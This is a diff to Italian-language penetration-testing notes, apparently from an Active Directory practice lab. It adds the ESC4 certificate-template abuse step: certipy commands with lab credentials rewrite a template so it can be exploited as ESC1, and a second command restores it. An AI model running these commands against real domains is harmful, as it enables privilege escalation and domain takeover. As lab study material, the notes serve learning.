@@ -245,9 +245,14 @@ certipy-ad auth -pfx administrator.pfx -dc-ip 192.168.56.12
 ```
 ![[Pasted image 20230828150913.png]]
 ### **ESC 4 - ADCS**
-Grazie al permesso genericWrite possiamo modificare il nostro
+Grazie al permesso genericWrite possiamo modificare il nostro template per renderlo vulnerabile all'ESC1
 ```bash
-
+certipy-ad template -u khal.drogo@essos.local -p 'horse' -template ESC4 -save-old -debug
+```
+Poi exploitalo come ESC1.
+Per riportarlo alla normalità
+```bash
+certipy template -u khal.drogo@essos.local -p 'horse' -template ESC4 -configuration ESC4.json
 ```
 ### **ESC 6 - ADCS**
 ### **ESC 8 - ADCS**
